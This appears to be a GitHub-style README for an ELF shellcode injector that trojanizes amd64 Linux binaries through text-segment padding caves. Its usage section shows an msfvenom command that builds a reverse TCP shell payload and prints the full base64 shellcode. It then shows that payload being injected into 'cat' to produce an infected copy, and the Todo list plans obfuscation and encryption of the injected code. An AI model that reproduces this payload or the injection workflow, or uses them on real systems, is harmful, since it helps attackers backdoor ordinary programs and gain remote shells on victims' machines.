# About
Binary file shellcode injector.  
ELF injection based on [Silvio Cesar Text Segment padding](https://web.archive.org/web/20131008165947/http://vxheaven.org/lib/vsc01.html)  
Saves original binary execution flow

# Installation
`pip install -r requirements.txt`

# Usage
Works only with amd64 ELF bins, for now...  
Example:  
```
Usage: viscr.py <binary> <b64 encoded shellcode>
============
> msfvenom -p linux/x64/shell_reverse_tcp -f base64  LHOST=127.0.0.1 LPORT=4242
ailYmWoCX2oBXg8FSJdIuQIAEJJ/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
============
> ./viscR.py cat ailYmWoCX2oBXg8FSJdIuQIAEJJ/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
Using user supplied shellcode
Arch === amd64
Endian === little
Found cave at 0x7049 ; size - 16457
cat_infctd created. Use wisely
```

# Todo
+ PE, Mach-O support
+ ARM64 support
+ Shellcode encoding/ubfuscation/encryption
+ etc. etc. etc.
